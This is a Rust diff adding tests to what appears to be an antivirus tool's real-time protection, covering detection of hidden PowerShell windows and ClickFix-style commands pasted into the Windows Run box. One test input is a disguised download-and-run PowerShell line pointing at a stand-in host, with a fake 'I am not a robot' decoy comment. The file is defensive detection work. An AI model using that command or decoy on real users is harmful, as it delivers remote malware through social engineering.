@@ -32,6 +32,10 @@ fn describe(event: RtpEvent) -> String {
         RtpEvent::Scanned { origin, report } => format!("scanned {origin:?} {}", report.stats.files_scanned),
         RtpEvent::RiskyFile { path, risk, .. } => format!("risky {} {}", name(&path), risk.disguise.is_some()),
         RtpEvent::RiskyChecked { path, outcome } => format!("checked {} {outcome:?}", name(&path)),
+        RtpEvent::Command(hit) => {
+            let rules: Vec<&str> = hit.matches.iter().map(|m| m.rule.as_str()).collect();
+            format!("command {:?} {} {}", hit.source, hit.program.to_ascii_lowercase(), rules.join(","))
+        }
         RtpEvent::Restarting { error, .. } => format!("restarting {error}"),
         RtpEvent::Error(e) => format!("error {e}"),
     }
@@ -203,12 +207,15 @@ fn a_detected_program_is_stopped_and_quarantined() {
 
     let mut cfg = RtpConfig::new(Vec::new());
     cfg.process_protection = true;
+    // Command lines of whatever else runs on this PC are not this test's business.
+    cfg.command_rules = false;
     cfg.quarantine_floor = Some(Category::Pup);
     cfg.defer_when_fullscreen = false;
     cfg.max_size_bytes = 1 << 20;
     let mut run = Run::start(&data_dir, cfg);
     assert!(run.until(|m| m.starts_with("started")));
-    assert_eq!(run.seen[0], "started 0 true");
+    // The sweep of programs already running can report before this.
+    assert_eq!(run.seen.last().unwrap(), "started 0 true");
     // Let the first look at running programs pass, so this one counts as new.
     std::thread::sleep(Duration::from_millis(1500));
 
@@ -296,4 +303,114 @@ fn a_burst_of_files_is_scanned_without_losses() {
     }
     assert_eq!(scanned, FILES, "{:?}", run.seen.iter().filter(|m| !m.starts_with("scanned")).collect::<Vec<_>>());
     assert!(run.seen.iter().any(|m| m.starts_with("detected") && m.contains("zz-last.txt")));
+}
+
+#[cfg(windows)]
+#[test]
+fn a_suspicious_command_line_is_reported_and_left_running() {
+    use std::os::windows::process::CommandExt;
+    let tmp = tempfile::tempdir().unwrap();
+    let data_dir = tmp.path().join("data");
+    let mut cfg = RtpConfig::new(Vec::new());
+    cfg.process_protection = true;
+    // Tests run in parallel: never stop another test's programs.
+    cfg.stop_running_threats = false;
+    cfg.defer_when_fullscreen = false;
+    let mut run = Run::start(&data_dir, cfg);
+    assert!(run.until(|m| m.starts_with("started")));
+    std::thread::sleep(Duration::from_millis(1500));
+
+    // Started through `cmd /c start`, so its parent is not this process:
+    // children of Phalanx itself are never checked. A hidden window only:
+    // Microsoft Defender blocks a hidden *encoded* command before it starts
+    // (decoding is tested with the Run box below).
+    let marker = format!("Start-Sleep -Seconds 20 # phalanx-test-{}", std::process::id());
+    std::process::Command::new("cmd")
+        .raw_arg(format!("/c start \"\" /b powershell -NoProfile -w hidden -c \"{marker}\""))
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+    // Other PowerShell processes on this PC may be reported too; wait for this one.
+    let found = run.until(|m| m == "command Program powershell.exe powershell.hidden");
+    let started = process::running()
+        .unwrap()
+        .into_iter()
+        .filter(|p| process::command_line(&p.id).is_some_and(|c| c.contains(&marker)))
+        .collect::<Vec<_>>();
+    let still_running = !started.is_empty();
+    for p in &started {
+        let _ = process::terminate(&p.id);
+    }
+    run.handle.stop();
+    assert!(found, "{:?}", run.seen);
+    assert!(still_running, "report-only: the process is not stopped");
+
+    // A hidden window alone is medium confidence: shown, not kept in history.
+    let store = scan::open_store(&data_dir).unwrap();
+    let recorded = store
+        .recent_scans(20, Some("command"))
+        .unwrap()
+        .iter()
+        .flat_map(|row| store.scan_detections(row.id).unwrap())
+        .any(|d| d.threat == "CommandLine.powershell.hidden");
+    assert!(!recorded);
+}
+
+#[test]
+fn run_box_commands_are_checked_and_hidden_scripts_scanned() {
+    let tmp = tempfile::tempdir().unwrap();
+    let engine = Engine::new(&EngineConfig::default()).unwrap();
+    let config = RtpConfig::new(Vec::new());
+    let stop = AtomicBool::new(false);
+    let cache = Mutex::new(DispositionCache::default());
+    let recent = Mutex::new(commands::Recent::default());
+    let events: EventSink = Mutex::new(Box::new(|_| {}));
+    let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };
+
+    let pasted = r#"powershell -w hidden -c "iex(irm https://x.test/v)" # I am not a robot - reCAPTCHA Verification ID: 4821"#;
+    let hit = commands::check_run_box(&ctx, pasted).unwrap();
+    let rules: Vec<&str> = hit.matches.iter().map(|m| m.rule.as_str()).collect();
+    assert_eq!(rules[0], "clickfix.run-box");
+    assert!(rules.contains(&"clickfix.decoy") && rules.contains(&"powershell.download-run"), "{rules:?}");
+    assert_eq!(hit.confidence(), crate::cmdline::Confidence::High);
+    assert!(commands::check_run_box(&ctx, "notepad").is_none());
+    assert!(commands::check_run_box(&ctx, "cmd").is_none());
+    assert!(commands::check_run_box(&ctx, "powershell").is_none());
+
+    // The decoded script goes through the signatures.
+    let payload = crate::system::encode_powershell(&format!("Write-Output '{}'", marker()));
+    let hit = commands::check_run_box(&ctx, &format!("powershell -enc {payload}")).unwrap();
+    assert!(hit.matches.iter().any(|m| m.rule == "signature.Test.ThreatScanner.Marker"), "{:?}", hit.matches);
+    assert_eq!(hit.script.as_deref(), Some(format!("Write-Output '{}'", marker()).as_str()));
+}
+
+#[test]
+fn only_confident_commands_are_kept_and_repeats_are_collapsed() {
+    let tmp = tempfile::tempdir().unwrap();
+    let engine = Engine::new(&EngineConfig::default()).unwrap();
+    let config = RtpConfig::new(Vec::new());
+    let stop = AtomicBool::new(false);
+    let cache = Mutex::new(DispositionCache::default());
+    let recent = Mutex::new(commands::Recent::default());
+    let (tx, rx) = mpsc::channel();
+    let events: EventSink = Mutex::new(Box::new(move |e| {
+        let _ = tx.send(describe(e));
+    }));
+    let ctx = Ctx { engine: &engine, data_dir: tmp.path(), config: &config, stop: &stop, halt: AtomicBool::new(false), cache: &cache, commands: &recent, excluded: &[], events: &events };
+    let store = scan::open_store(tmp.path()).unwrap();
+
+    let high = commands::check_run_box(&ctx, "cmd /c ping -n 1 127.0.0.1 & rem I am not a robot - verification").unwrap();
+    let medium = commands::check_run_box(&ctx, "powershell -NoProfile -w hidden -c Start-Sleep 1").unwrap();
+    // The Run box makes anything high; a program match alone can be medium.
+    let medium = CommandHit { source: CommandSource::Program, matches: medium.matches.into_iter().filter(|m| m.rule != "clickfix.run-box").collect(), ..medium };
+    assert!(high.in_history() && !medium.in_history());
+    for hit in [high.clone(), medium.clone(), high, medium] {
+        commands::report(&ctx, &store, hit);
+    }
+    let seen: Vec<String> = rx.try_iter().collect();
+    assert_eq!(seen.len(), 2, "repeats are collapsed: {seen:?}");
+    let kept = store.recent_scans(10, Some("command")).unwrap();
+    assert_eq!(kept.len(), 1, "only the high-confidence match is kept");
+    assert_eq!(store.scan_detections(kept[0].id).unwrap()[0].threat, "CommandLine.clickfix.run-box");
 }
